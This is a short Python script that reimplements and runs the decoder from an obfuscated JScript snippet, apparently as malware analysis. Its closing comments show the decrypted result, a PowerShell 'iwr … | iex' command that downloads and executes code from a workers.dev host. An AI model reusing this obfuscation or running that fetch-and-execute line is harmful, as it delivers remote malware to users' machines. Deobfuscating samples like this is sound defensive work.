"""
function dec2(base64) {
    var xml = new ActiveXObject("MSXML2.DOMDocument.3.0");
    var el = xml.createElement("base64");
    el.dataType = "bin.base64";
    el.text = base64;
    var bin = el.nodeTypedValue;

    var stream = new ActiveXObject("ADODB.Stream");
    stream.Type = 1;
    stream.Open();
    stream.Write(bin);
    stream.Position = 0;
    stream.Type = 2;
    stream.Charset = "utf-8";
    var str = stream.ReadText();
    stream.Close();
    return str;
}

function dec(str, key) {
    str = dec2(str)
    var result = "";
    for (var i = 0; i < str.length; i++) {
        var charCode = str.charCodeAt(i);
        var keyCharCode = key.charCodeAt(i % key.length);
        result += String.fromCharCode(charCode ^ keyCharCode);
        
    }
    return result;
}

console.log(dec("NAIIFzAuMlg1AyQNDgRMMS1qcgpgKx4cMQAEaDs3PDIFXyccFAIBRhZkHCkvIVIwAxA7GxsWMTg8", "w8T@Y@V7Bpx^w"));
console.log(dec("dTVUDD0rbzYAVUlVH3d5FwolNWItAVNfCx1vMBdLJTUmc0UYXwhSNyQfADgqYToRVxZaTD0u", "XVteJYO^t!9&%"));
"""

import base64


def dec2(base64_str):
    # Decode the base64 string
    xml = base64.b64decode(base64_str)
    # Convert the binary data to a string
    str_data = xml.decode('utf-8')
    return str_data

def dec(str_data, key):
    # Decode the base64 string
    str_data = dec2(str_data)
    result = ""
    for i in range(len(str_data)):
        char_code = ord(str_data[i])
        key_char_code = ord(key[i % len(key)])
        result += chr(char_code ^ key_char_code)
        
    return result

def main():
    # The base64 encoded strings
    str1 = "NAIIFzAuMlg1AyQNDgRMMS1qcgpgKx4cMQAEaDs3PDIFXyccFAIBRhZkHCkvIVIwAxA7GxsWMTg8"
    str2 = "dTVUDD0rbzYAVUlVH3d5FwolNWItAVNfCx1vMBdLJTUmc0UYXwhSNyQfADgqYToRVxZaTD0u"
    
    # The keys
    key1 = "w8T@Y@V7Bpx^w"
    key2 = "XVteJYO^t!9&%"
    
    # Decrypt the strings
    result1 = dec(str1, key1)
    result2 = dec(str2, key2)
    
    return result1, result2

if __name__ == "__main__":
    result1, result2 = main()
    print("Decrypted string 1:", result1)
    print("Decrypted string 2:", result2)

    # Decrypted string 1: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
    # Decrypted string 2: -c iwr https://cool-surf-87fc.oli-19f.workers.dev/|iex